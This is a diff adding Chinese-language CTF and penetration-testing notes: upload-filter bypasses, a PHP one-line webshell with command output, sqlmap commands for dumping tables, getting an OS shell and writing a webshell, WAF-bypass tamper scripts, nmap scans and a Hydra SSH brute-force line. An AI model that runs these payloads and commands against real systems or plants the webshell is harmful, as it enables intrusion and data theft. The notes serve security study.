@@ -115,6 +115,60 @@ Enjoy the labs
 
 ## 文件上传
 
++   基于前端 JS 的验证
+
+    firebug 修改一下 JS 文件 / 禁用 JS
+
++   基于文件后缀名的绕过
+
+    后缀名大小写混用
+
+    空格，加点，加下划线，双重后缀名，叠用 phphpp
+
+    PHP345别名绕过，.inc, .phtml, .phpt, .phps
+
+    %00截断：name=test.jpg0x00
+
+    ​		   1.aspchr(0)&XXX.jpg,chr(0)
+
+    ​		    /1.php，在1.php前嫁个空格，在hex中找到20再改为00
+
+    .htaccess(文件重写)：
+
+    ```
+    <FilesMatch "95zz.gif">
+    
+    SetHandler application/x-httpd-php
+    </FilesMatch>
+    ```
+
+    http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，
+
+    可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码
+
++   基于文件类型的检测
+
+    Content-Type : Multipart/form-data; 大小写绕过
+
++   基于文件头部信息的过滤
+
+    ```shell
+    copy xx.png+xxx.php out.jpg
+    # 再修改下后缀名
+    ```
+
+```javascript
+// 一句话木马
+<script language=php>eval($_POST['A'])</script>
+
+// 命令执行
+<script language=php> system("ls")</script>
+// 牛逼啊，直接能看到本目录下的所有文件
+about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php
+```
+
+
+
 ## PHP 特性
 
 ## 后台登录类
@@ -258,6 +312,401 @@ sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables
 # 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生
 sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表
 sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地
+```
+
+**参数解释**
+
+```
+* 在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分
+
+--data
+使用post方式提交的时候，就需要用到data参数了
+
+-p
+当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
+
+--level
+不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
+
+--random-agent
+使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
+
+--technique
+这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。
+支持的探测方式如下：
+B: Boolean-based blind SQL injection（布尔型注入）
+
+E: Error-based SQL injection（报错型注入）
+
+U: UNION query SQL injection（可联合查询注入）
+
+S: Stacked queries SQL injection（可多语句查询注入）
+
+T: Time-based blind SQL injection（基于时间延迟注入）
+```
+
+**Access注入**
+
+```
+sqlmap -u 注入点url //判断是否有注入
+
+sqlmap -u 注入点url --tables //access直接猜表
+
+sqlmap -u 注入点url  --colums -T admin //爆出admin表，猜解它的字段
+
+sqlmap -u 注入点url  --dump -T admin -C "username,password"  //猜字段内容
+```
+
+**MySQL数据库注入**
+
+```
+sqlmap -u url  --dbs  //获取数据库
+
+sqlmap  -u  url  -D 指定的数据库 --tables //获取数据库中的表
+
+sqlmap  -u  url  -D 指定的数据库 -T 表名  --columns  //获取表字段
+
+sqlmap  -u  url  -D 指定的数据库 -T 表名  -C id,user,pass --dump  //获取字段内容
+```
+
+**Cookie注入**
+
+网站有判断，不让用and,update等参数时就得加上Cookie。
+
+```
+sqlmap -u url --cookie="cookie值" --dbs(或)--tables --level 2
+```
+
+**POST表单注入**
+
+注入点：
+
+```
+http://testasp.vulnweb.com/Login.asp 
+```
+
+**几种方式：**
+
+```
+sqlmap -r burp拦截数据.txt -p Pass(测试参数) //从文件读取数据包
+
+sqlmap -u http://testasp.vulnweb.com/Login.asp  --forms //自动搜索表单
+
+sqlmap -u http://testasp.vulnweb.com/Login.asp  --data "Name=1&Pass=1"  //手动添加数据
+```
+
+**获取系统交互shell**
+
+```
+1.sqlmap -u http://url.. --os-shell  //或者windows可以用--os-cmd 或--sql-shell
+
+2.选择网站服务端语言
+
+3.填写网站根目录C:/www/
+```
+
+**伪静态注入**
+
+```
+sqpmap  -u http://victim.com/id/666*.html --dbs  //在html扩展名前加个'*'
+```
+
+**请求延时**
+
+Web防注入措施，在访问两次错误页面后，第三次必须访问正确的页面
+
+```
+--delay 2 //延时两秒访问
+
+--safe-freq 30  //人为配置次数
+```
+
+**绕过WAF防火墙**
+
+```
+sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch
+
+--tamper "space2morehash.py" //使用tamper脚本绕过
+
+类似脚本
+
+space2hash.py base64encode.py charencode.py
+```
+
+**file参数使用**
+
+必须为dba权限
+
+```
+sqlmap -u url --is-dba  //查看是否dba权限
+
+sqlmap -u url --file-write=本地木马路径(D:/shell.php)
+
+--file-dest=目标根目录(C:/www/shell.php)
+```
+
+**Tamper**
+
+DIY 部分，最具可玩性的地方。
+
+基本注入语句是一样的，可不同的网站过滤规则不一样，此时就需要编写Tamper进行本地化。
+
++   框架
+
+```python
+# sqlmap/tamper/escapequotes.py
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOWEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    return payload.replace("'", "\\'").replace('"', '\\"')
+
+'''
+priority 表示脚本的优先级，用于有多个脚本的情况
+'''
+```
+
+```python
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    data = '''{"admin_user":"admin%s","admin_pass":65};'''
+    payload = payload.lower()
+    payload = payload.replace('u', 'u0075')
+    payload = payload.replace('o', 'u006f')
+    payload = payload.replace('i', 'u0069')
+    payload = payload.replace(''', 'u0027')
+    payload = payload.replace('"', 'u0022')
+    payload = payload.replace(' ', 'u0020')
+    payload = payload.replace('s', 'u0073')
+    payload = payload.replace('#', 'u0023')
+    payload = payload.replace('>', 'u003e')
+    payload = payload.replace('<', 'u003c')
+    payload = payload.replace('-', 'u002d')
+    payload = payload.replace('=', 'u003d')
+    return data % payload
+```
+
++   tamper()
+
+返回处理后的 payload
+
+例如服务器上有这么几行代码
+
+```php
+$id = trim($POST($id),'union');
+$sql="SELECT * FROM users WHERE id='$id'";
+```
+
+而我们的payload为
+
+```
+-8363'  union select null -- -
+```
+
+这里union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper
+
+```python
+def tamper(payload, **kwargs):
+    return payload.replace('union','uniounionn')
+```
+
+保存为replaceunion.py，放到sqlmap/tamper/下
+
+执行的时候带上 --tamper=replaceunion 的参数，就可以绕过该过滤规则
+
+[官方tamper](https://blog.csdn.net/hxsstar/article/details/22782627)
+
++   dependencies()
+
+声明脚本的适用/不适用范围，可为空
+
+```python
+sqlmap/tamper/echarunicodeencode.py
+
+from lib.core.common import singleTimeWarnMessage
+
+def dependencies():
+singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])
+
+# singleTimeWarnMessage() 用于在控制台中打印出警告信息
+```
+
++   kwargs
+
+在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明
+
+```
+# sqlmap/tamper/vanrish.py
+
+def tamper(payload, **kwargs):
+    headers = kwargs.get("headers", {})
+    headers["X-originating-IP"] = "127.0.0.1"
+    return payload
+```
+
+这个脚本是为了更改 X-originating-IP，以绕过WAF，另一个 kwargs 的使用出现于 xforwardedfor.py，也是为了改 header 以绕过 waf
+
++   部分常数值
+
+```python
+# sqlmap/lib/enums.py
+
+class PRIORITY:
+    LOWEST = -100
+    LOWER = -50
+    LOW = -10
+    NORMAL = 0
+    HIGH = 10
+    HIGHER = 50
+    HIGHEST = 100
+
+class DBMS:
+    ACCESS = "Microsoft Access"
+    DB2 = "IBM DB2"
+    FIREBIRD = "Firebird"
+    MAXDB = "SAP MaxDB"
+    MSSQL = "Microsoft SQL Server"
+    MYSQL = "MySQL"
+    ORACLE = "Oracle"
+    PGSQL = "PostgreSQL"
+    SQLITE = "SQLite"
+    SYBASE = "Sybase"
+    HSQLDB = "HSQLDB"
+```
+
+### nmap
+
+常用指令：
+
+```shell
+nmap -sP 192.168.1.100        # 查看一个主机是否在线
+
+nmap 192.168.1.100            # 查看一个主机上开放的端口
+
+nmap -sV -O 192.168.0.100  	  # 判断目标操作系统类型
+
+nmap -sS 192.168.1.100        # 半开放syn扫描
+
+nmap -p 1-1000 192.168.1.100  # 扫描指定端口范围
+
+nmap -p 80 192.168.1.100      # 扫描特定端口
+
+nmap -sV 192.168.1.100  	  # 查看目标开放端口对应的协议及版本信息
+
+# 判断防火墙的扫描
+nmap -sF IP
+nmap -sA IP
+nmap -sW IP //ACK,探测防火墙扫描
+```
+
+>   其他参数
+>   -sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到
+>   -Pn 跳过Ping测试(防火墙)，扫描指定目标
+>   -v 详细模式V越多就越详细
+>   -p 80 ping指定端口
+>   --script=script_name 使用脚本
+>   [脚本列表](http://nmap.org/nsedoc/scripts/)
+
+**nmap脚本扫描：分类：**
+
+>   auth: 负责处理鉴权证书（绕开鉴权）的脚本
+
+>   broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务
+
+>   brute: 提供暴力破解方式，针对常见的应用如http/snmp等
+
+>   default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力
+
+>   discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等
+
+>   dos: 用于进行拒绝服务攻击
+
+>   exploit: 利用已知的漏洞入侵系统
+
+>   external: 利用第三方的数据库或资源，例如进行whois解析
+
+>   fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽
+
+>   malware: 探测目标机是否感染了病毒、开启了后门等信息
+
+>   safe: 此类与intrusive相反，属于安全性脚本
+
+>   version: 负责增强服务与版本扫描（Version Detection）功能的脚本
+
+>   vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067
+
+使用实例：
+
+```shell
+nmap --script=auth IP  
+//负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令
+http-php-version     //获得PHP版本信息
+Http-enum               //枚举Web站点目录
+smtp-strangeport   //判断SMTP是否运行在默认端口
+dns-blacklist         //发现IP地址黑名单
+```
+
+------
+
+```shell
+nmap --script=vuln 192.168.137.* //扫描常见漏洞
+smb-check-vulns  //检测smb漏洞
+samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞
+```
+
+------
+
+扫描wordpress应用的脚本
+
+```
+1.http-wordpress-plugins
+
+2.http-wordpress-enum
+
+3.http-wordpress-brute
+```
+
+测试WAF是否存在
+
+```shell
+nmap -p 80,443 --script=http-waf-detect 192.168.0.100
+
+nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
+```
+
+### Hydra
+
+爆破利器
+
+**用法：**
+
+```
+hydra <参数> <IP地址> <服务名>  
+hydra的一些参数:  
+-R 继续从上一次的进度开始爆破  
+-s <port> 指定端口  
+-l <username> 指定登录的用户名  
+-L <username-list> 指定用户名字典  
+-p <password> 指定密码  
+-t <number> 设置线程数  
+-P <passwd-list> 指定密码字典  
+-v 显示详细过程  
+```
+
+实例 爆破 ssh 登录密码
+
+```shell
+hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh
 ```
 
 ## 思路
